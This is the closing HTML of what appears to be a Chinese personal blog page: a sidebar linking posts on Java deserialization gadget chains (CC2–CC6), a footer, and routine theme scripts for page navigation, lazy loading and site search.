datetime="2026-01-28T10:00:03.000Z" title="发表于 2026-01-28 18:00:03">2026-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/28/CC2-Gadget/" title="java安全-CC2"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/1.webp" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-CC2"/></a><div class="content"><a class="title" href="/2026/01/28/CC2-Gadget/" title="java安全-CC2">java安全-CC2</a><time datetime="2026-01-28T10:00:02.000Z" title="发表于 2026-01-28 18:00:02">2026-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/28/CC4-Gadget/" title="java安全-CC4"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191215.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-CC4"/></a><div class="content"><a class="title" href="/2026/01/28/CC4-Gadget/" title="java安全-CC4">java安全-CC4</a><time datetime="2026-01-28T10:00:01.000Z" title="发表于 2026-01-28 18:00:01">2026-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/28/CC3-Gadget/" title="java安全-CC3"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191207.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-CC3"/></a><div class="content"><a class="title" href="/2026/01/28/CC3-Gadget/" title="java安全-CC3">java安全-CC3</a><time datetime="2026-01-28T10:00:00.000Z" title="发表于 2026-01-28 18:00:00">2026-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/15/CC6-chain/" title="java安全-CC6"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010126234.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-CC6"/></a><div class="content"><a class="title" href="/2026/01/15/CC6-chain/" title="java安全-CC6">java安全-CC6</a><time datetime="2026-01-15T10:00:02.000Z" title="发表于 2026-01-15 18:00:02">2026-01-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-flex"></div><div class="footer-other"><div class="footer-copyright"><span class="copyright">© 2025 chuanchuan</span><br/><span class="footer-separator">|</span><span class="footer-slogan">我希望海浪喧嚣，
+让我听到我孤独的自由才好</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3-b2"></script><script src="/js/main.js?v=5.5.3-b2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索一下.." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3-b2"></script></div></div></body></html>
